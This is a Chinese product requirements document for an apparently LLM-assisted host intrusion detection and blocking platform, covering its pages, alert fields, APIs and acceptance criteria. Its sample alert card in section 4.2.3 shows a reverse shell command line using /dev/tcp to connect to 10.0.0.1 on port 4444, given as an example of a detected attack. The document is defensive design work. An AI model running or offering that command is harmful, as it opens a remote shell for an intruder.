## 2. 产品概述

### 2.1 产品定位

Aegis智能主机安全系统是一个面向企业级运维和安全团队的全方位主机安全管理平台。系统融合大语言模型（LLM）的智能分析能力与Agent的自动化执行能力，实现从基线合规检查到漏洞智能修复再到运行时异常检测的完整安全运营闭环。

### 2.2 V5.0核心价值

- **智能异常检测**: 基于eBPF + Sigma的实时事件采集，LLM智能研判
- **2分钟研判窗口**: 按主机聚合事件，批量送LLM分析，降低误报
- **智能阻断**: 支持自动阻断和手动阻断，页面可控
- **规则生命周期**: LLM自动生成规则，支持人工审核与自动流转
- **轻量Agent**: 1C1G资源约束，Agent只做eBPF采集和Sigma初筛

### 2.3 目标用户

| 用户角色 | 核心需求 | 使用场景 |
|:---|:---|:---|
| 系统管理员 | 主机资产管理、合规检查 | 批量主机纳管、定期基线检查 |
| 运维工程师 | 自动化运维、故障修复 | 漏洞修复、配置修复 |
| 安全工程师 | 漏洞管理、安全合规、运行时检测 | 漏洞扫描、异常检测、阻断处理 |
| 安全合规专员 | 合规审计、报告生成 | 基线合规审计、漏洞报告 |

## 4. 功能需求详述

### 4.1 页面一：安全概览

**页面路径**: `/detection/overview`

#### 4.1.1 功能目标

提供ATT&CK攻击矩阵可视化展示，实时显示各攻击技术的检测数量、告警数量。

#### 4.1.2 界面布局

- **顶部区域**: 威胁统计卡片（今日告警数、今日阻断数、受影响主机数、活跃规则数）
- **中部区域**: ATT&CK矩阵可视化（14个战术，每个战术下的技术检测情况）
- **底部区域**: 24小时告警趋势图

### 4.2 页面二：告警中心

**页面路径**: `/detection/alerts`

#### 4.2.1 功能目标

展示AI研判后的安全告警，支持去重展示和手动阻断。

#### 4.2.2 界面布局

页面分为两个区域：

- **顶部区域**: 筛选条件（主机、严重程度、MITRE ID、状态、时间范围）
- **中部区域**: 告警列表（卡片式布局）
- **底部分页**

#### 4.2.3 告警卡片布局

```
┌─────────────────────────────────────────────────────────────┐
│ ALT-001 │ web-server-01 │ T1059.004 │ Critical │ 命中 3 次 │
├─────────────────────────────────────────────────────────────┤
│ 进程: /bin/bash -i (PID: 12345) │ 用户: www-data           │
│ 命令行: /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1        │
│ 首次: 2026-03-20 14:00:00 │ 最近: 2026-03-20 14:05:00      │
│ 状态: Active │ 自动阻断: ✅ 已执行                          │
│                                            [详情] [解决]    │
└─────────────────────────────────────────────────────────────┘
```

#### 4.2.4 核心字段

| 列名 | 字段 | 说明 |
|:---|:---|:---|
| 告警ID | `alert_id` | 点击查看详情 |
| 主机 | `hostname` | |
| MITRE ID | `mitre_id` | 标签 |
| 严重程度 | `severity` | Critical/High/Medium/Low |
| 命中次数 | `hit_count` | 去重后的累计次数 |
| 首次发现 | `first_seen_at` | |
| 最近发现 | `last_seen_at` | |
| 自动阻断 | `auto_blocked` | ✅/❌ |
| 状态 | `status` | Active/Resolved |
| 操作 | - | 详情/解决/阻断 |

#### 4.2.5 手动阻断按钮显示条件

- `auto_blocked = false` 且 `status = active`

## 5. API接口需求

### 5.1 ATT&CK矩阵

```
GET /api/v1/attack-matrix
Response:
  - tactics: 战术列表
    - id: 战术ID
    - name: 战术名称
    - techniques: 技术列表
      - id: 技术ID
      - name: 技术名称
      - alert_count: 告警数量
```

### 5.2 威胁统计

```
GET /api/v1/statistics/threats
Response:
  - today_alerts: 今日告警数
  - today_blocks: 今日阻断数
  - affected_hosts: 受影响主机数
  - active_rules: 活跃规则数
```

### 5.3 告警管理

```
GET /api/v1/alerts
Parameters: page, pageSize, host_id, severity, mitre_id, status, start_time, end_time

GET /api/v1/alerts/:id

POST /api/v1/alerts/:id/resolve

POST /api/v1/alerts/:id/block    (手动阻断)
```

### 5.4 阻断策略

```
GET /api/v1/block-policies

PUT /api/v1/block-policies/:mitre_id
Request: { enabled: bool, auto_block: bool }
```

### 5.5 规则管理

```
GET /api/v1/rules
Parameters: page, pageSize, status, mitre_id, query

GET /api/v1/rules/:id

PUT /api/v1/rules/:id/status
Request: { status: "active" | "disabled" }
```

### 5.6 告警趋势

```
GET /api/v1/statistics/alert-trend
Parameters: hours (默认24)
Response:
  - data: [{ timestamp, count }]
```

### 5.7 WebSocket

```
GET /api/v1/runtime/ws
推送类型: alert, block_status, rule_update
```

## 6. 验收标准

### 6.1 功能验收

- [ ] Agent 命中 Sigma 规则后可成功上报事件
- [ ] Backend 能按主机进行 2 分钟窗口聚合
- [ ] LLM 分析可输出告警、阻断建议
- [ ] 告警按 `host_id+pid+mitre_id` 正确去重并累计次数
- [ ] auto_block=true 时自动阻断生效
- [ ] auto_block=false 时只告警，手动阻断可执行
- [ ] 规则可按 24h/7d 生命周期自动流转

### 6.2 前端验收

- [ ] 安全概览页面正确展示14个战术的ATT&CK矩阵
- [ ] 告警中心实时接收WebSocket推送
- [ ] 告警去重正确展示hit_count
- [ ] 手动阻断按钮仅在auto_blocked=false时显示
- [ ] 阻断策略开关切换实时生效
- [ ] 规则详情弹窗正确显示规则内容和版本历史
- [ ] 规则审核操作（批准/禁用）正确执行

### 6.3 非目标（V5.0不做）

- 不提供原始事件历史检索（因不落库）
- 不提供除 kill_process 之外的自动阻断动作
- 不在 Agent 侧部署本地大模型
